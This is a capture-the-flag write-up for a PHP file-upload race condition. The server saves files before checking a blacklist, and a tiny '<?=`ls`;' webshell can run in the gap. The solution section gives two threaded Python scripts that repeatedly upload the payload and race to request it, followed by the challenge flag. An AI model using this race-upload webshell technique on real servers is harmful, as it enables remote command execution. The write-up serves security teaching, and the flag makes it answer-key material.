# Resume

### Challenge Details

This challenge is testing on Race Condition/TOCTOU(Time-of-check Time-of-use) type vulnerability which can often be seen in the real world.

A simple web allows you upload tiny files(less than 10 bytes), with blacklist being used. However, the logic for processing the uploaded files is wrong. The program uploads user's file into web directory first, then check the extensions against the blacklist. If the file is not permitted to be uploaded, the program will delete it. 

There is a time gap when the malicious file is being uploaded, and being deleted. This time gap allows participants to execute limited command(due to size limited) on the server.

PHP short tag `<?=` is always enabled regardless of `short_open_tag` directives in php.ini, which is short for `<?php echo`, and backtick ` can be used to execute shell command.  

### Setup Instruction

```
docker-compose up -d
```

### Possible hints

> I think Usain Bolt runs faster than Justin Gatlin, but a leopard beats them all! 

> PHP is the best language! Very convenient when you have enabled short tag.

> And also when you have a shortcut for shell_exec.

### Key concept

- TOCTOU
- PHP short tag
- PHP backtick for executing shell command.

### Solution

**Race Condition**

two scripts, one to upload file, and one to access the uploaded file before it gets deleted.

uploader.py

```python
import hackhttp
from multiprocessing.dummy import Pool as ThreadPool


def upload(lists):
    hh = hackhttp.hackhttp()
    proxy_str = ('127.0.0.1', 8080)
    raw = """POST /upload.php HTTP/1.1
Host: asdfasdf
Content-Length: 324
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
DNT: 1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary6eDS6MK3g1lytdOB
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.164 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en,zh-CN;q=0.9,zh;q=0.8
Connection: close

------WebKitFormBoundary6eDS6MK3g1lytdOB
Content-Disposition: form-data; name="upload_file"; filename="test.php"
Content-Type: image/png

<?=`ls`;
------WebKitFormBoundary6eDS6MK3g1lytdOB
Content-Disposition: form-data; name="submit"

greyhats{trust_me_this_is_not_flag}
------WebKitFormBoundary6eDS6MK3g1lytdOB--
"""
    code, head, html, redirect, log = hh.http('http://asdfasdf/upload.php', raw=raw)
    #print(str(code) + "\r")


pool = ThreadPool(10)
pool.map(upload, range(10000))
pool.close()
pool.join()

```

visitor.py

```python
import hackhttp
from multiprocessing.dummy import Pool as ThreadPool


def visit(lists):
    hh = hackhttp.hackhttp()
    proxy_str = ('127.0.0.1', 8080)
    raw = """GET /upload/test.php HTTP/1.1
Host: asdfasdf
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.164 Safari/537.36
DNT: 1
Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: en,zh-CN;q=0.9,zh;q=0.8
Connection: close
"""
    code, head, html, redirect, log = hh.http('http://asdfasdf/upload/test.php', raw=raw)
    #print(str(code) + "\r")
    if code == 200:
        print(html)


pool = ThreadPool(30)
pool.map(visit, range(10000))
pool.close()
pool.join()

```

(or can just use burp intruder)

`ls` command will show a flag file, just visit that file to get the flag.

### Learning objective

the same as key concepts?

### Flag

```
greyhats{h0vv_d1d_y0u_byp455_17?!?!}
```
